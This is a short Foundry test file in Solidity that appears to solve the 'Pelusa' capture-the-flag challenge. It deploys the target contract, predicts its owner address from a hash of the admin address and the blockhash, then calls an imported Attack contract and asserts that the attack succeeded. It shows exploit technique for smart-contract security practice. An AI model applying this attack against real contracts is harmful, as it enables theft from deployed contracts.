// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/Pelusa.sol";
import "../src/Attack.sol";
import "../src/Shooter.sol";

contract Hack is Test {
    Pelusa pelusa_contract;
    address admin = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        vm.startPrank(admin);
        pelusa_contract = new Pelusa();
        vm.stopPrank();
    }

    function test_hack() public {
        vm.startPrank(hacker);
        
        Attack atk_contract = new Attack();
        
        address owner = address(uint160(uint256(keccak256(abi.encodePacked(admin, blockhash(block.number))))));

        atk_contract.attack(address(pelusa_contract), owner);

        vm.stopPrank();
        assertEq(pelusa_contract.goals(), 2);
    }
}